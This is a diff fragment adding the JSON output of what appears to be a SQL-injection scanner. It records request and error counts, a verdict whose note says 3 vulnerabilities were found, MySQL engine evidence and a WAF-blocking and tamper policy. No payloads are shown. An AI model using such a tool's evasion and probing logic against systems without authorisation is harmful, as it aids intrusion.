+        "serverErr": 10,
+        "injection5xx": 22,
+        "authLostHits": 0,
+        "netErrPoints": 0
+      },
+      "blockRatio": 0,
+      "suggestBackoffMs": null,
+      "inconclusivePoints": [],
+      "advice": "无需处置"
+    },
+    "verdict": "no_vulnerability_detected",
+    "verdictNote": "本次扫描检出 3 条漏洞；verdict 仅描述「未检出」类阴性结论的可信度，命中详情见 vulns",
+    "dbmsEvidence": {
+      "dbms": "MySQL",
+      "level": "verified",
+      "levelText": "真实引擎验证",
+      "evidence": "e2e/real-mysql-lab（真实 8.0.28 / 8.0.37）+ e2e/waf-real",
+      "caveat": null,
+      "all": [
+        "MySQL:verified"
+      ]
+    },
+    "blockPolicy": {
+      "action": "none",
+      "reason": "无拦截证据，保持当前发包形态",
+      "tamperHint": [],
+      "backoffMs": null
+    }
+  },
+  "validity": {
+    "status": "ok",
+    "reliable": true,
+    "reason": "目标可达性与会话状态正常：累计 118 次请求，无连续失败/拦截/会话失效/持续 5xx 迹象",
+    "counts": {
+      "total": 118,
+      "failStreak": 0,
+      "blockHits": 0,
+      "serverErr": 10,
+      "injection5xx": 22,
+      "authLostHits": 0,
+      "netErrPoints": 0
+    },
+    "blockRatio": 0,
+    "suggestBackoffMs": null,
+    "inconclusivePoints": [],
+    "advice": "无需处置"
+  }
+}
